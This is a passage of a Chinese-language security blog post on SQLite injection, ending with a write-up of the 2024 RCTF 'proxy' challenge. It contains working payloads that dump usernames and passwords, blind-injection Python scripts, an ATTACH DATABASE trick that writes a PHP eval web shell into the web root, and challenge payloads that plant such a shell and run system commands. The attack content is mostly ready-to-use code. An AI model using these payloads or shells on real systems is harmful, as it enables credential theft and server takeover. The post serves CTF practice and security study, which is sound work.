+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2,substr((select group_concat(username || &#x27;|&#x27; || password) from users),1,50),4--</span><br><span class="line">id=-1&#x27; union select 1,2,substr((select group_concat(username || &#x27;|&#x27; || password) from users),51,50),4--</span><br><span class="line">id=-1&#x27; union select 1,2,substr((select group_concat(username || &#x27;|&#x27; || password) from users),101,50),4--</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>根据查询正确或错误时的页面回显来判断数据内容：</p>
+<p>sqlite 中没有 <code>ascii</code>,<code> mid</code>,<code> left</code> 等函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; or substr((select group_concat(sql) from sqlite_master),1,1)&gt;&#x27;a&#x27;/*</span><br></pre></td></tr></table></figure>
+
+<p>无回显</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213816749.png" alt="image-20250330151158748"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; or substr((select group_concat(sql) from sqlite_master),1,1)&lt;&#x27;a&#x27;/*</span><br></pre></td></tr></table></figure>
+
+<p>回显内容</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213816982.png" alt="image-20250330151132131"></p>
+<p>二分法盲注脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://127.0.0.1/testSQLite.php&#x27;  # 目标URL</span><br><span class="line">flag = &#x27;&#x27;  # 存储获取到的十六进制数据</span><br><span class="line"></span><br><span class="line">for i in range(1, 500):  # 遍历字符位置，最多 500 个字符</span><br><span class="line">   low = 32   # ASCII 可见字符最小值（&#x27; &#x27; 空格）</span><br><span class="line">   high = 128  # ASCII 范围（&#x27;~&#x27; 的下一个字符）</span><br><span class="line">   mid = (low + high) // 2  # 计算中间值</span><br><span class="line"></span><br><span class="line">   while (low &lt; high):  # 采用二分法查找当前字符</span><br><span class="line">       payload = &quot;-1&#x27; or substr((select hex(group_concat(sql)) from sqlite_master),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;/*&quot;.format(i, chr(mid))</span><br><span class="line"></span><br><span class="line">       datas = &#123; &quot;id&quot;: payload &#125;  # 传递数据</span><br><span class="line">       res = requests.post(url=url, data=datas)  # 发送 POST 请求</span><br><span class="line"></span><br><span class="line">       if &#x27;Username&#x27; in res.text:  # 服务器返回正确的情况</span><br><span class="line">           low = mid + 1</span><br><span class="line">       else:</span><br><span class="line">           high = mid</span><br><span class="line"></span><br><span class="line">       mid = (low + high) // 2  # 重新计算 mid</span><br><span class="line"></span><br><span class="line">   if (mid == 32 or mid == 127):  # 如果查到了 ASCII=32（空格） 或 127（DEL），说明结束</span><br><span class="line">       break</span><br><span class="line"></span><br><span class="line">   flag = flag + chr(mid)  # 把这个字符加入 flag</span><br><span class="line">   print(flag)  # 实时打印获取到的 flag 片段</span><br><span class="line"></span><br><span class="line">print(&#x27;\n&#x27; + bytes.fromhex(flag).decode(&#x27;utf-8&#x27;))  # 转换 hex 为字符串输出最终 SQL 语句</span><br></pre></td></tr></table></figure>
+
+<p>运行脚本即可注入完成</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213817209.png" alt="image-20250330152945447"></p>
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>SQLite 没有 <code>sleep()</code> 函数，但是有个 <code>randomblob(N)</code> 函数，其作用是返回一个 N 字节长的包含伪随机字节的 BLOG。 N 是正整数。可以用它来制造延时。</p>
+<p>并且 SQLite 没有 if，所以我们需要使用 <code>case…when</code> 来构造查询语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; or (case when(substr(sqlite_version(),1,1)=&#x27;3&#x27;) then randomblob(1000000000) else 0 end)/*</span><br></pre></td></tr></table></figure>
+
+<p>最后发现<code>randomblob()</code>太大了,直接给我网站干崩溃了,于是减一位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; or (case when(substr(sqlite_version(),1,1)=&#x27;3&#x27;) then randomblob(100000000) else 0 end)/*</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &#x27;http://127.0.0.1/testSQLite.php&#x27;  # 目标网站</span><br><span class="line">flag = &#x27;&#x27;  # 存储获取到的数据</span><br><span class="line"></span><br><span class="line">for i in range(1, 500):  # 假设 flag 长度最大为 50</span><br><span class="line">    for ascii_code in range(32, 127):  # 只测试可打印字符 (32-126)</span><br><span class="line">        payload = f&quot;-1&#x27; OR (CASE WHEN (substr((SELECT hex(group_concat(sql)) FROM sqlite_master), &#123;i&#125;, 1) = &#x27;&#123;hex(ascii_code)[2:].upper()&#125;&#x27;) THEN randomblob(100000000) ELSE 0 END)/*&quot;</span><br><span class="line"></span><br><span class="line">        data = &#123;&quot;id&quot;: payload&#125;  # 传递 SQL 注入的参数</span><br><span class="line">        start_time = time.time()  # 记录请求开始时间</span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">        end_time = time.time()  # 记录请求结束时间</span><br><span class="line">        elapsed_time = end_time - start_time  # 计算查询消耗时间</span><br><span class="line"></span><br><span class="line">        if elapsed_time &gt; 2:  # 如果查询耗时 &gt;2 秒，说明判断成立</span><br><span class="line">            flag += chr(ascii_code)</span><br><span class="line">            print(f&quot;当前提取数据: &#123;flag&#125;&quot;)</span><br><span class="line">            break  # 进入下一个字符</span><br><span class="line"></span><br><span class="line">print(&quot;\n完整提取的 SQL 语句:&quot;, bytes.fromhex(flag).decode(&#x27;utf-8&#x27;))</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="sqlite写shell"><a href="#sqlite写shell" class="headerlink" title="sqlite写shell"></a>sqlite写shell</h4><p>写shell依靠sqlite的创建数据库功能。<br>除了前面提到的 <code>sqlite3 test.db</code> 这种创建数据库方法还可以通过 <code>ATTACH DATABASE</code> 这种方法来实现。</p>
+<h5 id="attach"><a href="#attach" class="headerlink" title="attach"></a>attach</h5><p>当在同一时间有多个数据库可用，您想使用其中的任何一个。SQLite 的 <code>ATTACH DATABASE</code> 语句是用来选择一个特定的数据库，使用该命令后，所有的 SQLite 语句将在附加的数据库下执行。<br>也就是我们先用<code>splite3 test.db</code>命令打开了一个文件，进入了sqlite&gt;模式，仍然可以用attach附加一个数据库（自动创建）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE &#x27;testDB.db&#x27; as &#x27;TEST&#x27;;   #附加一个数据库命名为test</span><br></pre></td></tr></table></figure>
+
+<p><strong>关键点:</strong> 如果数据库文件路径设置在web目录下，就可以实现写shell的功能。<br>要实现写shell，需要如下操作：<br>通过 attach 在目标目录新建一个数据库文件 &#x3D;&gt; 在新数据库创建表 &#x3D;&gt; 在表中插入payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE &#x27;/var/www/html/sqlite_test/shell.php&#x27; AS shell;create TABLE shell.exp (payload text); insert INTO shell.exp (payload) VALUES (&#x27;&lt;?php @eval($_POST[&quot;x&quot;]); ?&gt;&#x27;); </span><br></pre></td></tr></table></figure>
+
+<p>这段SQL语句的内容是</p>
+<p>1.使用 <strong><code>ATTACH DATABASE</code></strong> 命令新建一个 <code>shell.php</code> 文件作为一个 SQLite 数据库挂载。</p>
+<p>2.在这个新的数据库中创建一个表 <code>exp</code>，其中包含一个 <code>payload</code> 列，用于存储恶意 PHP 代码。</p>
+<p>3.插入恶意 PHP 代码 <code>&lt;?php @eval($_POST[&quot;x&quot;]); ?&gt;</code></p>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h5 id="2024RCTF-proxy"><a href="#2024RCTF-proxy" class="headerlink" title="2024RCTF-proxy"></a>2024RCTF-proxy</h5><p>配了复现的docker,查看一下源代码</p>
+<p>index.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require(&#x27;Db.php&#x27;);</span><br><span class="line">require(&#x27;Proxy.php&#x27;);</span><br><span class="line">$BE = $_GET[&#x27;BE&#x27;] ?? &#x27;flag&#x27;;</span><br><span class="line">$URL = &#x27;/&#x27;.$BE.&#x27;.php&#x27;;</span><br><span class="line">$ProxyObj = new Proxy();</span><br><span class="line">if($ProxyObj-&gt;SendRequest($URL))</span><br><span class="line">&#123;</span><br><span class="line">    $DbObj = new Db();</span><br><span class="line">    $arysql = array();</span><br><span class="line">    $sess = md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">    $arysql[] = &quot;INSERT OR REPLACE INTO CacheMain VALUES (&#x27;&quot;.$sess.&quot;&#x27;, &quot;.time().&quot;)&quot;;</span><br><span class="line">    $arysql[] = &quot;INSERT INTO CacheDetail VALUES (&#x27;&quot;.$sess.&quot;&#x27;, &#x27;&quot;.$BE.&quot;&#x27;)&quot;;</span><br><span class="line">    $arysql[] = &quot;CREATE TABLE Cache_&quot;.$sess.&quot;_&quot;.$BE.&quot; (t TEXT)&quot;;</span><br><span class="line">    $arysql[] = &quot;INSERT INTO Cache_&quot;.$sess.&quot;_&quot;.$BE.&quot; VALUES(&#x27;&quot;.$ProxyObj-&gt;body.&quot;&#x27;)&quot;;</span><br><span class="line">    $DbObj-&gt;execMultiSQL($arysql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>用户通过 GET 请求传入 <code>BE</code> 参数，默认值为 <code>&#39;flag&#39;</code>。</p>
+<p>通过 <code>Proxy</code> 类的 <code>SendRequest</code> 方法，向构建的 URL（<code>&#39;/&#39; . $BE . &#39;.php&#39;</code>）发起请求。</p>
+<p>proxy.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Proxy&#123;</span><br><span class="line">    private $ch;</span><br><span class="line">    public $body;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;ch = curl_init() or die(curl_error());</span><br><span class="line">        //curl_setopt($this-&gt;ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function SendRequest($URL)</span><br><span class="line">    &#123;</span><br><span class="line">        $ret = TRUE;</span><br><span class="line">        if(isset($_SERVER[&#x27;HTTPS&#x27;]))&#123;</span><br><span class="line">            if($_SERVER[&#x27;HTTPS&#x27;] == &#x27;off&#x27;)</span><br><span class="line">            &#123;</span><br><span class="line">                $http = &#x27;http://&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">            else &#123;</span><br><span class="line">                $http = &#x27;https://&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            $http = &#x27;http://&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        $http .= $_SERVER[&#x27;SERVER_NAME&#x27;].&#x27;:&#x27;.$_SERVER[&#x27;SERVER_PORT&#x27;];</span><br><span class="line">        curl_setopt($this-&gt;ch, CURLOPT_URL, $http.$URL);</span><br><span class="line">        curl_setopt($this-&gt;ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        try&#123;</span><br><span class="line">            $this-&gt;body = curl_exec($this-&gt;ch);</span><br><span class="line">        &#125; catch (Exception $ex) &#123;</span><br><span class="line">            return FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">        return TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213817195.png" alt="image-20250330165027303"></p>
+<p><code>SendRequest</code> 方法构建了目标 URL，利用 <code>$_SERVER[&#39;SERVER_NAME&#39;]</code> 和 <code>$_SERVER[&#39;SERVER_PORT&#39;]</code> 构造请求的主机名和端口号。这个值会根据当前服务器的请求头构建，可以被攻击者伪造。</p>
+<p><code>$_SERVER[‘SERVER_NAME’].‘:’.$_SERVER[‘SERVER_PORT’];</code>可被伪造，导致我们可以控制其返回内容。<br><code>$_SERVER[‘SERVER_NAME’]</code>是当前服务器主机名或IP地址，用于标识当前正在执行脚本的服务器。通常情况下，它是从 HTTP 请求的 Host 头中获取的。<br><code>$_SERVER[‘SERVER_PORT’] </code>是当前运行脚本的服务器端口号。当在浏览器中访问一个网站时，默认的 HTTP 端口号是 80，HTTPS 端口号是 443。<br>注入点在$ProxyObj-&gt;body(其他地方也可以注入，但是会因为后面的sql语句执行失败，导致无法写入文件)</p>
+<h6 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h6><p>在公网服务器上起一个shell.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo &quot;a&#x27;);ATTACH DATABASE &#x27;/var/www/html/shell.php&#x27; AS shell;create TABLE shell.exp (payload text); insert INTO shell.exp (payload) VALUES (&#x27;&lt;?php eval(\$_GET[1]);?&gt;&#x27;);--&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>修改HOST为你的公网IP然后发送出去</p>
+<p>访问<code>/shell.php?1=system(‘cat flag.php’);</code> 即可</p>
+<p>没复现成</p>
+<h6 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h6><p>控制$BE注入</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213817393.png" alt="image-20250330174638019"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?BE=&#x27;);ATTACH DATABASE &#x27;/var/www/html/f12.php&#x27; AS shell;create TABLE shell.exp (payload text); insert INTO shell.exp (payload) VALUES (&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;); commit;--+</span><br></pre></td></tr></table></figure>
+
+<p>注意:源码中写了个rollback，也就是有一条sql语句执行没成功就回滚了，最终解法：手动commit提交一次…</p>
+<p>直接访问f12.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=system(&quot;whoami&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213817378.png" alt="image-20250330174618370"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">lu1ux</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/11/25/SQLite%E6%B3%A8%E5%85%A5/">http://example.com/2025/11/25/SQLite%E6%B3%A8%E5%85%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="/img/14.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/11/25/XSS%E5%9F%BA%E7%A1%80/" title="XSS基础"><img class="cover" src="/img/19.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">XSS基础</div></div></a></div><div class="next-post pull-right"><a href="/2025/11/25/MSServer/" title="MSServer"><img class="cover" src="/img/7.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">MSServer</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avator.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">lu1ux</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">14</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lu1ux"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">网安小白一枚</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLite%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">SQLite注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLite%E5%9F%BA%E7%A1%80"><span class="toc-number">1.2.</span> <span class="toc-text">SQLite基础</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SQLite%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.2.1.</span> <span class="toc-text">SQLite创建数据库</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQLite%E6%89%93%E5%BC%80%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.2.2.</span> <span class="toc-text">SQLite打开数据库</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQLite-%E9%99%84%E5%8A%A0%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.2.3.</span> <span class="toc-text">SQLite 附加数据库</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQLite%E5%88%9B%E5%BB%BA%E8%A1%A8"><span class="toc-number">1.2.4.</span> <span class="toc-text">SQLite创建表</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQLite%E6%9F%A5%E7%9C%8B%E8%A1%A8"><span class="toc-number">1.2.5.</span> <span class="toc-text">SQLite查看表</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQLite%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE"><span class="toc-number">1.2.6.</span> <span class="toc-text">SQLite插入数据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQLite%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.2.7.</span> <span class="toc-text">SQLite查询语句</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQLite-%E6%B3%A8%E9%87%8A"><span class="toc-number">1.2.8.</span> <span class="toc-text">SQLite 注释</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQLite-sqlite-master-%E8%A1%A8"><span class="toc-number">1.2.9.</span> <span class="toc-text">SQLite sqlite_master 表</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLite%E6%B3%A8%E5%85%A5-1"><span class="toc-number">1.3.</span> <span class="toc-text">SQLite注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2-SQL-%E8%AF%AD%E5%8F%A5%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-number">1.3.1.</span> <span class="toc-text">查询 SQL 语句字段数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="toc-number">1.3.2.</span> <span class="toc-text">查询回显位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E8%A1%A8%E5%90%8D%E5%92%8C%E5%88%97%E5%90%8D"><span class="toc-number">1.3.3.</span> <span class="toc-text">查询表名和列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE"><span class="toc-number">1.3.4.</span> <span class="toc-text">查询数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.5.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.6.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlite%E5%86%99shell"><span class="toc-number">1.3.7.</span> <span class="toc-text">sqlite写shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#attach"><span class="toc-number">1.3.7.1.</span> <span class="toc-text">attach</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.4.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2024RCTF-proxy"><span class="toc-number">1.4.1.</span> <span class="toc-text">2024RCTF-proxy</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%B3%95%E4%B8%80"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">法二</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/URLDNS/" title="URLDNS"><img src="/img/12.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="URLDNS"/></a><div class="content"><a class="title" href="/2025/11/25/URLDNS/" title="URLDNS">URLDNS</a><time datetime="2025-11-25T14:03:06.000Z" title="Created 2025-11-25 22:03:06">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/CC%E9%93%BE/" title="CC链"><img src="/img/9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CC链"/></a><div class="content"><a class="title" href="/2025/11/25/CC%E9%93%BE/" title="CC链">CC链</a><time datetime="2025-11-25T14:02:54.000Z" title="Created 2025-11-25 22:02:54">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" title="信息泄露"><img src="/img/24.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="信息泄露"/></a><div class="content"><a class="title" href="/2025/11/25/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" title="信息泄露">信息泄露</a><time datetime="2025-11-25T13:50:42.000Z" title="Created 2025-11-25 21:50:42">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/upload/" title="upload"><img src="/img/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="upload"/></a><div class="content"><a class="title" href="/2025/11/25/upload/" title="upload">upload</a><time datetime="2025-11-25T13:44:39.000Z" title="Created 2025-11-25 21:44:39">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/SSRF/" title="SSRF"><img src="/img/13.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SSRF"/></a><div class="content"><a class="title" href="/2025/11/25/SSRF/" title="SSRF">SSRF</a><time datetime="2025-11-25T13:44:33.000Z" title="Created 2025-11-25 21:44:33">2025-11-25</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By lu1ux</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script src="/js/sakuraPlus.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
